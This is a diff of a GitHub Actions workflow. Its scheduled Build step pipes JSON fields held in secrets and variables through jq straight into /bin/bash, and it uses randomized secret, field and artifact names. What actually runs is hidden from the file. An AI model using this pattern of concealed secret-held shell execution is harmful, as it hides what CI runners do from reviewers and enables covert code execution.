@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '45 5,11,17,23 * * *'
+    - cron: '41 1,7,13,19 * * *'
 permissions:
   contents: read
 jobs:
@@ -16,17 +16,14 @@ jobs:
           fetch-depth: 1
       - name: Build
         env:
-          jazr66580: ${{ secrets.jazr66580 }}
+          lcu4: ${{ secrets.lcu4 }}
         run: |
-          printf '%s' "$jazr66580" | jq -r .caim2 | /bin/bash
-          printf '%s' "$tgofe90601" | jq -r .g858 | /bin/bash
-          printf '%s' "$zryhg4289" | jq -r .j4 | /bin/bash
-          printf '%s' "$syhb1" | jq -r .uzb1150 | /bin/bash
-          echo $pw427 | jq -r .oig976 | /bin/bash
+          printf '%s' "$lcu4" | jq -r .ham08 | /bin/bash
+          printf '%s' "$i34533" | jq -r .eqnm39 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
         with:
-          name: Guv8NvZD
+          name: HnBUZkIB
           path: "*.zip"
           retention-days: 1
